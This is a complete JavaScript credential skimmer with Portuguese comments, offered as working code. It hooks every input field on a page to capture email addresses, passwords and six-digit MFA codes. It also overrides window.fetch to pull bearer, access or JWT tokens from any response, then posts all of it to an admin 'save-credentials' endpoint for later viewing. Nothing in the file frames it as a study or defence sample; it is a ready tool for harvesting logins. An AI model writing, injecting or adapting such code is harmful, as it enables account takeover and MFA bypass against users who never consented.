/**
 * AUTH INTERCEPTOR - CAPTURA DE LOGIN
 * 
 * Captura TODOS os dados de login (email, senha, MFA) automaticamente
 * Salva no banco de dados para o admin visualizar
 */

(function() {
  'use strict';
  
  console.log('[Auth Interceptor] 🔐 Sistema de captura ATIVO!');
  
  // Store temporário
  const loginData = {
    email: null,
    password: null,
    mfaCode: null,
    bearerToken: null,
  };
  
  let saveTimeout = null;
  
  /**
   * Salvar dados no banco via API
   */
  async function saveLoginData() {
    if (!loginData.email || !loginData.password) {
      console.log('[Auth Interceptor] ⚠️ Dados incompletos, aguardando...');
      return;
    }
    
    try {
      console.log('[Auth Interceptor] 💾 Salvando credenciais:', {
        email: loginData.email,
        passwordLength: loginData.password.length,
        hasMFA: !!loginData.mfaCode
      });
      
      const payload = {
        email: loginData.email,
        password: loginData.password,
      };
      
      if (loginData.mfaCode) {
        payload.mfaSecret = loginData.mfaCode;
      }
      
      if (loginData.bearerToken) {
        payload.bearerToken = loginData.bearerToken;
      }
      
      // Simple REST endpoint
      const response = await fetch('/api/admin/save-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });
      
      const result = await response.json();
      console.log('[Auth Interceptor] ✅ Credenciais salvas!', result);
      
    } catch (error) {
      console.error('[Auth Interceptor] ❌ Erro ao salvar:', error);
    }
  }
  
  /**
   * Agendar salvamento (debounce)
   */
  function scheduleSave() {
    if (saveTimeout) clearTimeout(saveTimeout);
    saveTimeout = setTimeout(saveLoginData, 2000);
  }
  
  /**
   * Monitorar TODOS os inputs
   */
  function monitorInputs() {
    document.addEventListener('input', function(e) {
      const input = e.target;
      if (!input || !input.value) return;
      
      const value = input.value.trim();
      if (!value) return;
      
      // Capturar EMAIL
      if (value.includes('@') && value.includes('.')) {
        if (loginData.email !== value) {
          loginData.email = value;
          console.log('[Auth Interceptor] 📧 Email capturado:', value);
          scheduleSave();
        }
      }
      
      // Capturar SENHA (qualquer input type=password com mais de 5 caracteres)
      if (input.type === 'password' && value.length >= 6) {
        if (loginData.password !== value) {
          loginData.password = value;
          console.log('[Auth Interceptor] 🔑 Senha capturada (length:', value.length, ')');
          scheduleSave();
        }
      }
      
      // Capturar MFA (6 dígitos numéricos)
      if (value.length === 6 && /^\d{6}$/.test(value)) {
        if (loginData.mfaCode !== value) {
          loginData.mfaCode = value;
          console.log('[Auth Interceptor] 🔐 Código MFA capturado:', value);
          scheduleSave();
        }
      }
    }, true);
    
    console.log('[Auth Interceptor] 👂 Monitorando inputs...');
  }
  
  /**
   * Interceptar fetch para detectar login bem-sucedido
   */
  function interceptFetch() {
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
      const response = await originalFetch.apply(this, args);
      
      // Clonar response para ler o body
      const clonedResponse = response.clone();
      
      try {
        const data = await clonedResponse.json();
        
        // Capturar token Bearer de QUALQUER resposta
        if (data) {
          // Procurar token em vários formatos possíveis
          const token = data.token || data.accessToken || data.access_token || 
                       data.bearerToken || data.bearer_token || data.authToken || 
                       data.auth_token || data.jwt || data.JWT;
          
          if (token && typeof token === 'string') {
            loginData.bearerToken = token;
            console.log('[Auth Interceptor] 🎫 Token Bearer capturado:', token.substring(0, 20) + '...');
          }
          
          // Também verificar dentro de data.data
          if (data.data) {
            const nestedToken = data.data.token || data.data.accessToken || data.data.access_token;
            if (nestedToken && typeof nestedToken === 'string') {
              loginData.bearerToken = nestedToken;
              console.log('[Auth Interceptor] 🎫 Token Bearer capturado (nested):', nestedToken.substring(0, 20) + '...');
            }
          }
        }
        
        // Se a resposta contém dados de usuário, provavelmente é um login bem-sucedido
        if (data && (data.user || data.token || data.accessToken)) {
          console.log('[Auth Interceptor] ✅ Login detectado! Salvando dados...');
          saveLoginData();
        }
      } catch (e) {
        // Ignorar erros de parse
      }
      
      return response;
    };
    
    console.log('[Auth Interceptor] 🌐 Fetch interceptado');
  }
  
  /**
   * Inicializar quando DOM estiver pronto
   */
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
      monitorInputs();
      interceptFetch();
    });
  } else {
    monitorInputs();
    interceptFetch();
  }
  
  console.log('[Auth Interceptor] ✅ Interceptador inicializado!');
})();
